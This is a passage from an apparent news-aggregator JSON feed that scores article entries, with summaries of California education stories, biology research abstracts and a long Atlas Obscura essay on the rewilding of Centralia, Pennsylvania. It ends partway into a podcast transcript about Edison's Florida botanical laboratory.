      {
        "url": "https://edsource.org/2024/as-we-expand-universal-preschool-access-lets-ensure-teachers-mirror-their-students-ethnicity/715393",
        "title": "As we expand universal preschool access, let’s ensure teachers mirror their students’ ethnicity",
        "summary": "Author&#8217;s original hed: As Universal Preschool Access Expands to Reach More Families of Color, So Do Inequitable Practices Such as Racial Bias, Exclusionary Discipline and Lack of Cultural Representation, Leading to a Crisis for Black Boys As California progresses toward universal preschool access, the need increases for training, hiring and retaining early childhood male educators who are racially and ethnically representative of the children... <span class=\"read-more\"><a href=\"https://edsource.org/2024/as-we-expand-universal-preschool-access-lets-ensure-teachers-mirror-their-students-ethnicity/715393\">read more</a></span>",
        "source": "edsource.org",
        "published": "Tue, 09 Jul 2024 15:53:36 +0000",
        "fetched_at": "2026-02-09T23:33:59.064016Z",
        "tags": [
          {
            "name": "scale_shift",
            "score": 5
          }
        ],
        "structural_score": 5,
        "timeliness_score": 3,
        "final_score": 4.0,
        "reddit_score": null,
        "reddit_comments": null
      },
      {
        "url": "https://edsource.org/2024/survey-californians-are-worried-about-student-health-lukewarm-toward-a-state-school-bond/709604",
        "title": "Survey: Californians are worried about student health, lukewarm toward a state school bond",
        "summary": "The annual Public Policy Institute of California survey on education issues found wide support for universal TK and teaching about slavery but divisions on transgender issues.",
        "source": "edsource.org",
        "published": "Thu, 11 Apr 2024 05:11:37 +0000",
        "fetched_at": "2026-02-09T23:33:59.064618Z",
        "tags": [
          {
            "name": "scale_shift",
            "score": 5
          }
        ],
        "structural_score": 5,
        "timeliness_score": 3,
        "final_score": 4.0,
        "reddit_score": null,
        "reddit_comments": null
      },
      {
        "url": "https://edsource.org/2026/appeals-court-pauses-california-gender-law/748472",
        "title": "Federal appeals court pauses ruling on student gender identity disclosure in California",
        "summary": "An appeals court panel wrote that it is “skeptical” of the lower court’s decision, which would challenge policies adopted by 598 of the state’s nearly 1,000 local school districts.",
        "source": "edsource.org",
        "published": "Thu, 08 Jan 2026 00:04:46 +0000",
        "fetched_at": "2026-02-09T23:33:59.059668Z",
        "tags": [
          {
            "name": "value_redefinition",
            "score": 4
          }
        ],
        "structural_score": 4,
        "timeliness_score": 3,
        "final_score": 3.5,
        "reddit_score": null,
        "reddit_comments": null,
        "temp_score_struct": 3.6999999999999997,
        "temp_score_trend": 3.3
      },
      {
        "url": "https://edsource.org/2025/clovis-unified-preschool-program-gets-creative-with-state-arts-funding/743835",
        "title": "Clovis Unified preschool program gets creative with state arts funding",
        "summary": "Clovis Unified is using $150,000 of state arts funding to provide arts, music and theater education to preschool students through an interactive farm exhibit.",
        "source": "edsource.org",
        "published": "Mon, 03 Nov 2025 08:05:00 +0000",
        "fetched_at": "2026-02-09T23:33:59.060354Z",
        "tags": [
          {
            "name": "boundary_crossing",
            "score": 4
          }
        ],
        "structural_score": 4,
        "timeliness_score": 3,
        "final_score": 3.5,
        "reddit_score": null,
        "reddit_comments": null,
        "temp_score_struct": 3.6999999999999997,
        "temp_score_trend": 3.3
      },
      {
        "url": "https://edsource.org/2025/california-tk-english-screening-tools/743756",
        "title": "California rethinks how to identify 4-year-olds who need extra help learning English",
        "summary": "The challenge is that children at this age are still developing language skills. In the past, students would sometimes cry and put their heads down on the desk during tests.",
        "source": "edsource.org",
        "published": "Tue, 28 Oct 2025 07:04:00 +0000",
        "fetched_at": "2026-02-09T23:33:59.060399Z",
        "tags": [
          {
            "name": "value_redefinition",
            "score": 4
          }
        ],
        "structural_score": 4,
        "timeliness_score": 3,
        "final_score": 3.5,
        "reddit_score": null,
        "reddit_comments": null,
        "temp_score_struct": 3.6999999999999997,
        "temp_score_trend": 3.3
      }
    ],
    "mycotech": [
      {
        "url": "https://journals.plos.org/plosbiology/article?id=10.1371/journal.pbio.3003597",
        "title": "A deep learning-based computational pipeline predicts developmental outcome in retinal organoids",
        "summary": "<p>by Cassian Afting, Norin Bhatti, Christina Schlagheck, Encarnación Sánchez Salvador, Laura Herrera-Astorga, Rashi Agarwal, Risa Suzuki, Nicolaj Hackert, Hanns-Martin Lorenz, Lucie Zilova, Joachim Wittbrodt, Tarik Exner</p>\n\nRetinal organoids have become important models for studying development and disease, yet stochastic heterogeneity in the formation of cell types, tissues, and phenotypes remains a major challenge. This limits our ability to precisely experimentally address the early developmental trajectories towards these outcomes. Here, we utilize deep learning to predict the differentiation path and resulting tissues in retinal organoids well before they become visually discernible. Our approach effectively bypasses the challenge of organoid-related heterogeneity in tissue formation. For this, we acquired a high-resolution time-lapse imaging dataset comprising about 1,000 organoids and over 100,000 images enabling precise temporal tracking of organoid development. By combining expert annotations with advanced image analysis of organoid morphology, we characterized the heterogeneity of the retinal pigmented epithelium (RPE) and lens tissues, as well as global organoid morphologies over time. Using this training set, our deep learning approach accurately predicts the emergence and size of RPE and lens tissue formation as well as similarities in overall organoid morphology on an organoid-by-organoid basis at early developmental stages, refining our understanding of when early lineage decisions are made. This approach advances knowledge of tissue and phenotype decision-making in organoid development and can inform the design of similar predictive platforms for other organoid systems, paving the way for more standardized and reproducible organoid research. Finally, it provides a direct focus on early developmental time points for in-depth molecular analyses, alleviated from confounding effects of heterogeneity.",
        "source": "journals.plos.org",
        "published": "2026-01-27T14:00:00Z",
        "fetched_at": "2026-02-09T23:34:13.692708Z",
        "tags": [
          {
            "name": "boundary_crossing",
            "score": 7
          },
          {
            "name": "visibility_gain",
            "score": 4
          },
          {
            "name": "value_redefinition",
            "score": 4
          },
          {
            "name": "scale_shift",
            "score": 5
          }
        ],
        "structural_score": 20,
        "timeliness_score": 1,
        "final_score": 10.5,
        "reddit_score": null,
        "reddit_comments": null
      },
      {
        "url": "https://www.sciencedaily.com/releases/2026/02/260206012213.htm",
        "title": "A hidden Aloe vera compound takes aim at Alzheimer’s",
        "summary": "Scientists have uncovered promising clues that compounds found in Aloe vera could play a role in fighting Alzheimer’s disease. Using advanced computer modeling, researchers discovered that beta-sitosterol—a natural plant compound—strongly interacts with two key enzymes involved in memory loss and cognitive decline. The compound showed stability, strong binding, and favorable safety indicators, making it a standout candidate for future drug development.",
        "source": "www.sciencedaily.com",
        "published": "Sun, 08 Feb 2026 07:57:41 EST",
        "fetched_at": "2026-02-09T23:34:12.381300Z",
        "tags": [
          {
            "name": "boundary_crossing",
            "score": 7
          },
          {
            "name": "visibility_gain",
            "score": 4
          }
        ],
        "structural_score": 11,
        "timeliness_score": 4,
        "final_score": 7.5,
        "reddit_score": null,
        "reddit_comments": null
      },
      {
        "url": "https://journals.plos.org/plosbiology/article?id=10.1371/journal.pbio.3003631",
        "title": "Recurrent mutations in the stress regulator Cap1 reveal a trade-off between azole resistance and oxidative stress response in <i>Candida albicans</i>",
        "summary": "<p>by Xin Zhou, Audrey Hilk, Norma V. Solis, Nancy Scott, Christopher Zajac, Scott G. Filler, Anna Selmecki</p>\n\nDrug resistance is a critical challenge in treating life-threatening fungal infections. Here, we uncover a mechanism of acquired azole resistance in <i>Candida albicans</i> through mutations in <i>CAP1</i>, encoding a conserved fungal transcription factor that mediates the oxidative stress response. We analyzed 300 clinical isolates and identified 25 distinct <i>CAP1</i> missense or nonsense mutations, with many occurring within the DNA-binding domain. We identified two nearly identical <i>CAP1</i> heterozygous nonsense mutations, one in an isolate obtained from a bloodstream infection and one in a population of cells undergoing adaptation to fluconazole in vitro. Both <i>CAP1</i> nonsense mutations resulted in loss of the C-terminal nuclear export signal, leading to nuclear retention of Cap1 and subsequent activation of genes associated with the oxidative stress response and drug transport. The <i>CAP1</i> C-terminal truncations conferred significant fitness advantages in the presence of fluconazole, both in vitro and in a murine model of candidiasis. Strikingly, we discovered a therapeutic vulnerability: azole concentrations above the minimal inhibitory concentration were fungicidal to mutants with the <i>CAP1</i> C-terminal truncation. The fungicidal effect was attributed to both elevated azole-induced reactive oxygen species and a compromised oxidative stress response in Cap1-truncated cells. Our results provide novel characterization of de novo <i>CAP1</i> point mutations emerging in both laboratory and clinical contexts, elucidate the mechanisms underlying Cap1-regulated stress responses, and reveal a potential therapeutic target for overcoming drug resistance in <i>C. albicans</i> infections.",
        "source": "journals.plos.org",
        "published": "2026-02-02T14:00:00Z",
        "fetched_at": "2026-02-09T23:34:13.692647Z",
        "tags": [
          {
            "name": "boundary_crossing",
            "score": 2
          },
          {
            "name": "visibility_gain",
            "score": 4
          },
          {
            "name": "value_redefinition",
            "score": 4
          },
          {
            "name": "scale_shift",
            "score": 4
          }
        ],
        "structural_score": 14,
        "timeliness_score": 1,
        "final_score": 7.5,
        "reddit_score": null,
        "reddit_comments": null
      },
      {
        "url": "https://www.sciencedaily.com/releases/2026/02/260206012210.htm",
        "title": "This tiny molecular trick makes spider silk almost unbreakable",
        "summary": "Scientists have cracked a key mystery behind spider silk’s legendary strength and flexibility. They discovered that tiny molecular interactions act like natural glue, holding silk proteins together as they transform from liquid into incredibly tough fibers. This same process helps create silk that’s stronger than steel by weight and tougher than Kevlar.",
        "source": "www.sciencedaily.com",
        "published": "Fri, 06 Feb 2026 01:22:10 EST",
        "fetched_at": "2026-02-09T23:34:12.381305Z",
        "tags": [
          {
            "name": "visibility_gain",
            "score": 4
          },
          {
            "name": "scale_shift",
            "score": 5
          }
        ],
        "structural_score": 9,
        "timeliness_score": 4,
        "final_score": 6.5,
        "reddit_score": null,
        "reddit_comments": null
      },
      {
        "url": "https://www.sciencedaily.com/releases/2026/01/260107225541.htm",
        "title": "A hidden world inside DNA is finally revealed",
        "summary": "DNA doesn’t just sit still inside our cells — it folds, loops, and rearranges in ways that shape how genes behave. Researchers have now mapped this hidden architecture in unprecedented detail, showing how genome structure changes from cell to cell and over time. These insights reveal why many disease-linked mutations outside genes can still cause harm. The findings could speed up the discovery of genetic risks and inspire new ways to target diseases.",
        "source": "www.sciencedaily.com",
        "published": "Thu, 08 Jan 2026 21:16:11 EST",
        "fetched_at": "2026-02-09T23:34:12.381738Z",
        "tags": [
          {
            "name": "boundary_crossing",
            "score": 4
          },
          {
            "name": "visibility_gain",
            "score": 5
          }
        ],
        "structural_score": 9,
        "timeliness_score": 4,
        "final_score": 6.5,
        "reddit_score": null,
        "reddit_comments": null
      },
      {
        "url": "https://journals.plos.org/plosbiology/article?id=10.1371/journal.pbio.3003592",
        "title": "Dynamic auxin maxima regulate male-to-hermaphrodite conversion and de novo meristem formation in the fern <i>Ceratopteris</i> gametophytes",
        "summary": "<p>by Dinh Nhan Lai, Xi Yang, Chong Xie, Ting Li, An Yan, Xing Liu, Yun Zhou</p>\n\nLand plants alternate between generations of asexual sporophytes and sexual gametophytes. Unlike seed plants, ferns produce free-living gametophytes that grow independently from their sporophytes. Gametophytes of the model fern <i>Ceratopteris</i> exist in two sex types: hermaphrodites and males. Hermaphrodites maintain meristems and secrete the pheromone antheridiogen, inducing undecided gametophytes to become males. In the absence of antheridiogen, males exhibit developmental plasticity and dynamic cell fate specification by initiating de novo meristems to convert into hermaphrodites. Despite its essential role, the molecular signals governing this process remain unclear. Here, we show that local auxin biosynthesis, dynamically regulated during sex-type conversion, establishes new auxin maxima that are critical for specifying and promoting the proliferation of the meristem progenitor cell (MPC) lineage, ultimately enabling the de novo formation of a multicellular meristem from a single MPC. Time-lapse imaging revealed that upon antheridiogen removal, auxin signaling is specifically activated at the initial site of proliferation in <i>Ceratopteris</i> males, triggering new meristem formation. This auxin signaling subsequently becomes concentrated at the center of the proliferating meristem, aligning with localized auxin biosynthesis and the emergence of the meristem notch. Computationally reconstrued lineage maps further showed that chemical inhibition of CrTAA1 abolishes these dynamic auxin patterns, blocking MPC lineage initiation and its subsequent proliferation. Furthermore, genetic knockout of <i>CrTAA1</i> via CRISPR-Cas9 phenocopies the effects of chemical inhibition, preventing new meristem formation and disrupting male-to-hermaphrodite conversion. Together, these findings uncover a molecular mechanism underlying sex-type conversion in land plants and highlight the pivotal role of de novo auxin biosynthesis in orchestrating cell fate and proliferation during meristem formation.",
        "source": "journals.plos.org",
        "published": "2026-01-23T14:00:00Z",
        "fetched_at": "2026-02-09T23:34:13.692726Z",
        "tags": [
          {
            "name": "boundary_crossing",
            "score": 2
          },
          {
            "name": "visibility_gain",
            "score": 5
          },
          {
            "name": "scale_shift",
            "score": 5
          }
        ],
        "structural_score": 12,
        "timeliness_score": 1,
        "final_score": 6.5,
        "reddit_score": null,
        "reddit_comments": null
      },
      {
        "url": "https://phys.org/news/2026-02-qa-ai-discovery-therapeutic-drugs.html",
        "title": "Q&A: Using AI to accelerate the discovery and design of therapeutic drugs",
        "summary": "In the pursuit of solutions to complex global challenges including disease, energy demands, and climate change, scientific researchers, including at MIT, have turned to artificial intelligence, and to quantitative analysis and modeling, to design and construct engineered cells with novel properties. The engineered cells can be programmed to become new therapeutics—battling, and perhaps eradicating, diseases.",
        "source": "phys.org",
        "published": "Sat, 07 Feb 2026 13:00:01 EST",
        "fetched_at": "2026-02-09T23:34:11.256130Z",
        "tags": [
          {
            "name": "boundary_crossing",
            "score": 4
          },
          {
            "name": "scale_shift",
            "score": 5
          }
        ],
        "structural_score": 9,
        "timeliness_score": 3,
        "final_score": 6.0,
        "reddit_score": null,
        "reddit_comments": null
      },
      {
        "url": "https://www.sciencedaily.com/releases/2026/01/260112211455.htm",
        "title": "A new test reveals which antibiotics truly kill bacteria",
        "summary": "Some antibiotics stop bacteria from growing without actually killing them, allowing infections to return later. Scientists at the University of Basel created a new test that tracks individual bacteria to see which drugs truly eliminate them. When tested on tuberculosis and other serious lung infections, the method revealed big differences in how bacteria tolerate treatment. The findings could lead to more precise therapies and better predictions of treatment success.",
        "source": "www.sciencedaily.com",
        "published": "Mon, 12 Jan 2026 21:33:16 EST",
        "fetched_at": "2026-02-09T23:34:12.381704Z",
        "tags": [
          {
            "name": "boundary_crossing",
            "score": 4
          },
          {
            "name": "visibility_gain",
            "score": 4
          }
        ],
        "structural_score": 8,
        "timeliness_score": 4,
        "final_score": 6.0,
        "reddit_score": null,
        "reddit_comments": null,
        "temp_score_struct": 6.8,
        "temp_score_trend": 5.199999999999999
      },
      {
        "url": "https://www.sciencedaily.com/releases/2026/01/260112001034.htm",
        "title": "The oxygen you breathe depends on a tiny ocean ingredient",
        "summary": "Microscopic ocean algae produce a huge share of Earth’s oxygen—but they need iron to do it. New field research shows that when iron is scarce, phytoplankton waste energy and photosynthesis falters. Climate-driven changes may reduce iron delivery to the oceans, weakening the base of marine food chains. Over time, this could mean fewer krill and fewer whales, seals, and penguins.",
        "source": "www.sciencedaily.com",
        "published": "Mon, 12 Jan 2026 09:01:37 EST",
        "fetched_at": "2026-02-09T23:34:12.381709Z",
        "tags": [
          {
            "name": "transformation",
            "score": 3
          },
          {
            "name": "scale_shift",
            "score": 5
          }
        ],
        "structural_score": 8,
        "timeliness_score": 4,
        "final_score": 6.0,
        "reddit_score": null,
        "reddit_comments": null
      },
      {
        "url": "https://www.anthropocenemagazine.org/2026/02/could-we-cool-the-planet-by-turning-crop-waste-into-building-materials/?utm_source=rss&utm_medium=rss&utm_campaign=could-we-cool-the-planet-by-turning-crop-waste-into-building-materials",
        "title": "The remarkable climate case for turning farm waste into building materials",
        "summary": "Wheat straw and rice husks already appear in niche construction products. A new study explores the global climate effects if they went mainstream.",
        "source": "www.anthropocenemagazine.org",
        "published": "Fri, 06 Feb 2026 13:00:00 +0000",
        "fetched_at": "2026-02-09T23:34:15.222794Z",
        "tags": [
          {
            "name": "transformation",
            "score": 3
          },
          {
            "name": "scale_shift",
            "score": 5
          }
        ],
        "structural_score": 8,
        "timeliness_score": 4,
        "final_score": 6.0,
        "reddit_score": null,
        "reddit_comments": null
      }
    ],
    "curiosity": [
      {
        "url": "https://www.atlasobscura.com/articles/centralia-pennsylvania-rebirth",
        "title": "The Rebirth of Pennsylvania’s Infamous Burning Town",
        "summary": "<p>“There’s not much there anymore, it’s pretty much just a crossroads.”</p>\n<p>I read the posts online telling me not to bother, but I wanted to go anyway. Certainly I could feel something as we got close: the sense of desperation, of ruin and abandon. So I drove with a small group of friends deep into eastern Pennsylvania—coal country—through towns with names like Frackville, Pottsville, Ashland. Many downtowns had at least one house that had burned to ruin and been left abandoned. It was early June, but clouds covered the sky and we drove through a slight but persistent rain.</p>\n<p>We were on our way to Centralia, Pennsylvania. The Burning Town.</p>\n<p>The coal that made this valley famous accreted in layers over tens of thousands of years, organic swamp matter turning first to peat, and then compressed over millennia into billions of tons of anthracite—the densest and most pure form of coal—the stuff that made this region of Pennsylvania famous. Mines first opened here in 1856 and Centralia was incorporated as a town a decade later. Through the years bitter labor disputes broke out over exploitative treatment of the (largely Irish immigrant) miners, leading to regular outbreaks of violence. Add to that the boom and bust cycle of the coal industry—and the environmental desolation and impoverishment of the region—and you end up with a town that is deeply scarred, both literally and metaphorically.</p>\n<p>But the story that made Centralia famous began in May 1962, when officials set fire to the trash in a local landfill in an open strip-mine pit. This wasn’t the first year they’d done this, and there were firefighters stationed to ensure the blaze didn’t get out of control. After two days, the trash fire seemed to have burned itself out. But this time, for whatever reason (the actual cause was never fully determined), something went wrong. The landfill burn had lit the coal mines beneath the town.</p>\n<figure class=\" contains-caption \"><img alt=\"article-image\" class=\"article-image with-structured-caption \" src=\"https://assets.atlasobscura.com/article_images/106279/image.jpg\" width=\"auto\" /></figure>\n<p>Over the years, numerous attempts were made to put out the fire. Nothing worked. In all, federal, state, and local governments spent over $3.3 million on the blaze, which raged on, uncontrollably. Over time, residents reported that their basements were strangely hot, and in 1979, the mayor John Coddington lowered a thermometer into an underground fuel tank at the gas station he owned, only to discover that the gasoline was 172 degrees Fahrenheit. And then on Valentine’s Day, 1981, a twelve-year old boy fell into a four-foot-wide sinkhole that opened up in his grandmother’s backyard, barely rescued by his fourteen year-old cousin. A plume of lethal carbon monoxide bellowed out from the hole.</p>\n<p>Realizing that topsoil was the only thing separating the town from a massive, raging inferno, the federal government finally decided to clear the town. The United States Congress allocated money for a buyout, which nearly all of the town’s 1,000 or so residents took. By 1990, 63 people remained in the town. Two years later, governor Bob Casey invoked eminent domain and condemned all the remaining buildings. By 2021, only five homes were still left standing.</p>\n<p>I had come here expecting that we would find ruin and neglect, toxicity and destitution. I expected Centralia to be an exemplar of the <em>eerie: </em>A place where once there had been a town, place of thriving life, and instead now was only absence, an emptiness, a void.</p>\n<p>What we found instead, strangely, was beauty. Centralia, despite everything I’d been led to expect, was thriving.</p>\n<figure class=\" contains-caption \"><img alt=\"article-image\" class=\"article-image with-structured-caption \" src=\"https://assets.atlasobscura.com/article_images/106274/image.jpg\" width=\"auto\" /></figure>\n<hr class=\"baseline-grid-hr\" />\n<p>The Burning Town has come to stand in as a kind of exemplar of a post-industrial wasteland, a place where human folly reached its apex, scorching the land. All but abandoned, it became known primarily for the vents that poured smoke from the fire below, and for Graffiti Highway—a closed stretch of Route 61 covered in tags, doodles of genitalia, and declarations of love.</p>\n<p>When adapting the video game franchise <em>Silent Hill </em>for film, screenwriter Roger Avary used Centralia as a model for both the town’s backstory and its look. For years it drew curious onlookers and legend trippers, while the name “Centralia” itself became an almost byword for late capitalism: a term for that mixture of rapacious profit-seeking and thoughtless stewardship that created America’s own Chernobyl.</p>\n<p>Locals see the story a little differently, though their version borrows from similar themes. Phil, a tour guide at Pioneer Tunnel in neighboring Ashland, pointed out that while the grim toil of the mines claimed many human lives, their closure left the valley with little else to offer. He explained how the families that didn’t leave Centralia were harassed, as government forces tried to drive them off their land. Those that stayed had to go to court to defend their right to live on this abandoned land, all because they wanted to keep the mineral rights to their property. So now, people like Phil assume that the government is just waiting them out. Once they’re gone, putting out the fire will be easy enough. “They’ll take all that red hot coals, but also they’re going to get that rich anthracite coal,” he told us. “And I’m sure they’ll sell that. But are the people or the relatives going to get anything? It’s very doubtful. It’ll probably go to the federal government. Or the coal baron, maybe?”</p>\n<p>His voice, I noticed after a while, has a peculiar kind of nostalgia for the worst times in the world. Like so many others in these towns, he seems to long for a return, another chance for Pennsylvanians to throw their children back into the maw of the mine. Anything for a chance to get the coal jobs will come back. Anything in service of waking the Mountain once more.</p>\n<figure class=\" contains-caption \"><img alt=\"article-image\" class=\"article-image with-structured-caption \" src=\"https://assets.atlasobscura.com/article_images/106256/image.jpg\" width=\"auto\" /></figure>\n<p>When we finally got to Centralia, we were met not with destruction or despair, but with what seemed at first simply like nothing. The streets are still laid out, and there are still a handful of houses left, but the graffiti highway has been covered over. Any abandoned buildings have long been torn down.</p>\n<p>It’s why, if you ask around these days, folks will tell you there’s nothing to see in Centralia. “I drove through Centralia 2 weeks ago,” one local commented on a <a href=\"https://www.reddit.com/r/Pennsylvania/comments/1cw0xqc/looking_to_visit_centralia_is_it_still_legal_to_go/\">Reddit thread</a>. “I didn’t realize till after I had already passed it. That should tell you everything you need to know.” In another thread a different local <a href=\"https://www.reddit.com/r/Pennsylvania/comments/1ikd2rs/i_have_some_questions_regarding_traveling_through/\">commented</a>, “What is the draw? It’s just empty ground now.”</p>\n<p>But emptiness can tell its own story. Standing on the empty streets of Centralia, I thought mainly of Cal Flynn’s <em>Islands of Abandonment: Nature Rebounding in the Post-Human Landscape. </em>Flynn travels the world to places that have been forsworn by humanity: not the pristine, untouched wilderness, but places abandoned, like Chernobyl and the exclusion zone that divides the island of Cyprus between its Greek and Turkish halves. Places where, Flynn writes, “nature has been allowed to work unfettered.” Such places are often thriving with plant and animal life. Abandonment, she writes, “<em>is </em>rewilding, in a very pure sense, as humans draw back and nature reclaims what once was hers.”</p>\n<figure class=\" contains-caption \"><img alt=\"article-image\" class=\"article-image with-structured-caption \" src=\"https://assets.atlasobscura.com/article_images/106273/image.jpg\" width=\"auto\" /></figure>\n<p>What Flynn makes clear is that while we tend to think of human activity on the landscape as not only damaging but <em>irreversible</em>, this may not always be the case. We believe, in our hubris, that we have the power to wreck nature for good. And while it’s true that places like the Bikini Atoll and Chernobyl will be radioactive for unimaginable human lifetimes, that doesn’t mean that other species haven’t moved in and, left unmolested by human activity, found ways to flourish.</p>\n<p>Flynn’s book catalogs a variety of ways in which nature has reclaimed places that we’ve left behind, often with surprising speed. When Estonia, for example, became independent of the Soviet Union, some 245 million square miles of collectivist farmlands were simply abandoned. They weren’t plowed over, repurposed, or re-seeded. They simply were left alone. Flora immediately went to work: soon these fields were covered in wildflowers and weeds, and then thorn bushes and brambles, and then the skinny shoots of young spruce trees. Now, thirty-five years later, Estonia is now one of the most forested countries in Europe, having nearly doubled the size of its forests by doing … nothing. Half the country is now a forest, and over 90 percent of those forests have naturally regenerated.</p>\n<p>When I say that Centralia is <em>thriving, </em>this is what I mean. It is a landscape pulsing with life, overflowing with lush greenery. The old grid of streets is still visible, and there are still a handful of houses with carefully mowed lawns sitting in defiance. But everything else is the wild and vital province of nature. Turkeyfoot, broom-sedge, and switchgrass and silky dogwood. Young white oaks and linden trees push their way through this cacophony of life. Everywhere that’s not asphalt is a riot of green in every possible shade. And all of this is possible, at least in part, because the state and federal governments have forbidden any new human settlement, giving the wild and the lush and untrammeled room to grow.</p>\n<p>Not all of this is just nature. In 2021, the Eastern Pennsylvania Coalition for Abandoned Mine Reclamation planted 250 apple trees in the hope of attracting butterflies. EPCAMR has hosted annual trash clean-ups in the town, but a few years ago turned to planting and furthering the former town’s potential as an unofficial wildlife sanctuary. “We’re trying to get that area designated as a monarch way station eventually,” Robert “Bobby” Hughes, executive director of EPCAMR said at the time. But as vital as this work is, it seems primarily that the rewilding of Centralia is simply the work of leaving it alone.</p>\n<p>Standing in what was once a small, otherwise forgettable town, I came to understand how folly, mistake, calamitous hubris, neglect, and plain stupidity—could all be weapons in an arsenal to rewild and reforest the Earth, a future waiting in places we mistakenly believe we have irredeemably scarred.</p>\n<figure class=\" contains-caption \"><img alt=\"article-image\" class=\"article-image with-structured-caption \" src=\"https://assets.atlasobscura.com/article_images/106280/image.jpg\" width=\"auto\" /></figure>\n<hr class=\"baseline-grid-hr\" />\n<p>Beyond the town itself, the thing people have come to mourn here is the Graffiti Highway, which for years was a strange destination before it was covered over in 2020. It began, as these things often do, as spontaneous tagging and defacement. But over time, more taggers added their names, their designs, their art, and their stories, until it had become a makeshift historical record of the people who live here.</p>\n<p>Over time, it had begun to encroach on the natural history that was also unfolding, spilling out beyond the asphalt and into the forest, as trees and plants started to get defaced. It became an attractive nuisance, repeated bonfires and ATV crashes straining local resources, so when coal company Pagnotti Enterprises bought the land in 2018, they chose to bury the road in dirt and erased it for good. There is now, in the words of many Redditors, no reason to go to Centralia. But the company’s decision also obliterated what some saw as a vital piece in the region’s history. Pagnotti’s<a href=\"https://www.google.com/search?q=pagnotti+enterprises&amp;oq=pagnotti+enterprises&amp;gs_lcrp=EgZjaHJvbWUyBggAEEUYOdIBCDM4MjBqMGo3qAIAsAIA&amp;sourceid=chrome&amp;ie=UTF-8#lrd=0x89c51a61c01ed687:0x1b1a2cd6c4d6b514,1,,,,\"> reviews</a> on Google are uniformly one-star ratings alongside comments like “You ruined graffiti highway,” “ruined a landmark, nice piles of dirt, go die,” and so on.</p>\n<p>For those who contributed to the Graffiti Highway, it had marked loves and losses, honored the dead and celebrated the living, all in a hundred different colors. (Park Street in Centralia has since begun to take the place of the old Graffiti Highway, decorated with a variety of tags, but at the moment it has nowhere near the density of the original Graffiti Highway. Some monuments take time to rebuild.)</p>\n<p>Kutztown University professor Deryl Johnson has called the story of Graffiti Highway an “epilogue” to the story of Centralia itself, but I’m not sure I agree. The story of Centralia is still very much unfolding—it did not end in 1982, and it did not end in 2020. Now that the highway is gone, the tourist attraction draw of this place has waned, leaving even more space for the natural world to reclaim the land. A new chapter has begun, and there may be other chapters in the story yet to come—chapters whose shape and direction we can only guess at.</p>\n<figure class=\" contains-caption \"><img alt=\"article-image\" class=\"article-image with-structured-caption \" src=\"https://assets.atlasobscura.com/article_images/106277/image.jpg\" width=\"auto\" /></figure>\n<hr class=\"baseline-grid-hr\" />\n<p>If you think of Centralia in terms of human habitation, it’s a ghost town, a few stubborn holdouts fighting against entropy and inertia. If you think of Centralia in terms of legend tripping and ruin porn, it’s nothing at all, barely a wide spot in the road. But if you think of Centralia as an unintended nature preserve, it is absolutely bursting with life and potential and possibility.</p>\n<p>Yet still the ground burns. Just out of the grid of streets that was once the town, down Big Mine Run Road, are the vents themselves: small holes in the sides of the hills like something out of Tolkien that lead down to inferno below. These days, the smoke itself is rarely visible, but when rain filters down to the fires, it comes back out as steam. So on the rainy day of our visit, we watched as these vents let out a small, steady stream of white steam, proof of the heat somewhere beneath our feet.</p>\n<p>It was an odd sensation. The wisps seemed peaceful, laconic, almost soothing. And at the same time, it seemed as though at any moment the entire valley would explode. Somehow it felt like both of these things at once.</p>\n<p>Looking at these gentle wisps of smoke, it is difficult to picture the smoldering inferno they emerged from. A fire that has raged out of control for sixty years, unending and older than most people you know. You try and you fail every time.</p>\n<p>Which is to say, Centralia’s mine fire is a thing that should not be. I can describe to you its history, the actions of the people involved. I can describe to you what the surface looks like, the species of plants, the words etched into the tombstones at the Odd Fellows Cemetery. But the secret, raging, burning heart of the Valley remains elusive.</p>\n<p>The plumes are a subtle reminder, easy to miss, that there is a reason for this pristine, thriving wildness all around us. That the coal mines underground are a price that has to be paid, paid to an underworld god that must be forever fed.</p>",
        "source": "www.atlasobscura.com",
        "published": "Tue, 13 Jan 2026 17:18:00 -0500",
        "fetched_at": "2026-02-09T23:34:22.475517Z",
        "tags": [
          {
            "name": "transformation",
            "score": 9
          },
          {
            "name": "boundary_crossing",
            "score": 6
          },
          {
            "name": "scale_shift",
            "score": 4
          }
        ],
        "structural_score": 19,
        "timeliness_score": 3,
        "final_score": 11.0,
        "reddit_score": null,
        "reddit_comments": null
      },
      {
        "url": "https://www.atlasobscura.com/articles/podcast-edison-ford-winter-estate",
        "title": "Inside Thomas Edison’s Botanical Laboratory",
        "summary": "<div>\n<p class=\"item-body-text-graf\"><strong>Listen and subscribe on <a href=\"https://podcasts.apple.com/us/podcast/the-atlas-obscura-podcast/id1555769970\">Apple Podcasts</a>, <a href=\"https://open.spotify.com/show/0s0c4Z99PwbW8efTmHckyT\">Spotify</a>, and all major podcast apps.</strong></p>\n</div>\n<hr class=\"baseline-grid-hr\" />\n<p><strong>Kelly McEvers: </strong>Thomas Edison and his family had a ritual. Every winter, they would leave freezing cold New Jersey and head down to Fort Myers, Florida. Back then, Fort Myers was out there. Think swamps and mosquitoes. It was actually easier to get around by boat than over land.</p>\n<p>The Edisons would do vacation stuff: go fishing, go on boat rides, collect interesting plants. And in 1914, they invited a different branch of American inventing royalty to join them. That year, Henry Ford, of the Model T Ford, came down to Florida with his wife, Clara.</p>\n<p>Ford must have been psyched because Edison was actually his hero. They’d met briefly years before at a conference when Ford was still a low-level employee at an Edison company. Now they were meeting on something like equal terms.</p>\n<p>So to celebrate the occasion, Ford had some Model Ts shipped down to Fort Myers. Everyone went out joyriding around the swamps. The cars flooded, their campsite got soaked. Clara Ford was really afraid of snakes, and there were snakes everywhere. Henry tried to scare them away by shooting off a pistol. Needless to say, it was a trip.</p>\n<p>But soon, once the smoke from Ford’s pistol had cleared and the Model Ts had dried out, Edison and Ford would become more than just travel buddies. They were actually about to embark on an enormous inventing project, a project that would turn Edison’s Florida house into a full-fledged botanical laboratory and would become the last great obsession of Edison’s life.</p>\n<p>I’m Kelly McEvers, and this is <em>Atlas Obscura</em>, a celebration of the world’s strange, incredible, and wondrous places. Today’s episode is brought to you in partnership with Fort Myers – Islands, Beaches and Neighborhoods. Maybe when you think of Henry Ford and Thomas Edison, you think technology, cars, light bulbs, electricity. But the success of both of their inventions depended on plants. That is why they had come to Florida: to experiment.</p>\n<p><em>This is an edited transcript of the </em><a href=\"https://www.atlasobscura.com/podcast\"><em>Atlas Obscura Podcast</em></a><em>: a celebration of the world’s strange, incredible, and wondrous places. Find the show on </em><a 